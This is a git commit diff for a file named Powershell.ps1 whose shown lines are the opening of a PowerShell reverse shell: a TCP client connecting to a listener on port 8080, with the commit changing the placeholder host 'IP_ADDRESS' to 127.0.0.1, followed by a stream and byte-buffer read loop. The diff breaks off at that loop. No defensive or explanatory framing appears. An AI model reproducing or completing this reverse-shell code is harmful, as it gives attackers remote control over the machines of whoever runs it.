833fd3608f4f2498d482824364279779dbe3d0f2
Byte Wizard <122925084+BYT3W1Z4RD@users.noreply.github.com>
2023-01-23 05:17:37 +0000

    Update Powershell.ps1

--- Powershell.ps1
+++ Powershell.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("IP_ADDRESS", 8080);
+$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 8080);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
